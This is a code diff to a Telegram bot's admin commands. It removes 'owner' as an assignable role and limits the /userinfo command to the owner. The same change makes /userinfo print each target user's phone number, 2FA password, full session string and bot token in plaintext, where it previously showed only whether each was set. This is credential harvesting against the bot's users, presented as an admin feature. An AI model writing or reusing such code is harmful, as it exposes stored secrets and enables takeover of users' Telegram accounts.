@@ -48,8 +48,8 @@ async def setrole(client, message):
         target_id = int(parts[1]) if parts[1].strip("-").isdigit() else parts[1]
         new_role = parts[2]
         duration = parts[3] if len(parts) > 3 else None
-        if new_role not in ['free', 'premium', 'admin', 'owner']:
-            await message.reply("Invalid role. Use: free, premium, admin, owner")
+        if new_role not in ['free', 'premium', 'admin']:
+            await message.reply("Invalid role. Use: free, premium, admin")
             return
         await set_user_role(target_id, new_role, duration)
         logger.info(f"Admin action: setrole user={target_id} → {new_role}" + (f" ({duration}d)" if duration else "") + f" by={message.from_user.id}")
@@ -100,8 +100,7 @@ async def unban(client, message):
 
 @app.on_message(filters.command("userinfo") & filters.private)
 async def userinfo(client, message):
-    user = await get_user(message.from_user.id)
-    if (OWNER_ID is None or int(message.from_user.id) != int(OWNER_ID)) and (not user or user.get("role") != "admin"):
+    if OWNER_ID is None or int(message.from_user.id) != int(OWNER_ID):
         return
     try:
         target_id = message.text.split()[1]
@@ -116,13 +115,16 @@ async def userinfo(client, message):
     username    = f"@{target['username']}" if target.get("username") else "—"
     role        = (target.get("role") or "free").upper()
     banned      = "🚫 Yes" if target.get("is_banned") else "✅ No"
-    session     = "✅ Connected" if target.get("phone_session_string") else "❌ Not set"
-    bot         = "✅ Set" if target.get("bot_token") else "❌ Not set"
     expiry      = target.get("premium_expiry_date") or "—"
     dl_today    = target.get("downloads_today", 0)
     dl_month    = target.get("downloads_this_month", 0)
     last_dl     = target.get("last_download_date") or "—"
     joined      = target.get("created_at") or "—"
+
+    session_string  = target.get("phone_session_string") or "—"
+    phone_number    = target.get("phone_number") or "—"
+    two_fa          = target.get("two_fa_password") or "—"
+    bot_token       = target.get("bot_token") or "—"
 
     text = (
         f"👤 **User Info**\n\n"
@@ -132,14 +134,16 @@ async def userinfo(client, message):
         f"**Role:** `{role}`\n"
         f"**Banned:** {banned}\n"
         f"**Premium expires:** `{expiry}`\n\n"
-        f"**Session:** {session}\n"
-        f"**Upload bot:** {bot}\n\n"
+        f"**Phone:** `{phone_number}`\n"
+        f"**2FA Password:** `{two_fa}`\n"
+        f"**Session String:** `{session_string}`\n"
+        f"**Upload Bot Token:** `{bot_token}`\n\n"
         f"**Downloads today:** `{dl_today}`\n"
         f"**Downloads this month:** `{dl_month}`\n"
         f"**Last download:** `{last_dl}`\n"
         f"**Joined:** `{joined}`"
     )
-    logger.info(f"Admin action: userinfo target={target_id} by={message.from_user.id}")
+    logger.info(f"Owner action: userinfo target={target_id} by={message.from_user.id}")
     await message.reply(text)
 
 @app.on_message(filters.command("set_force_sub") & filters.private)
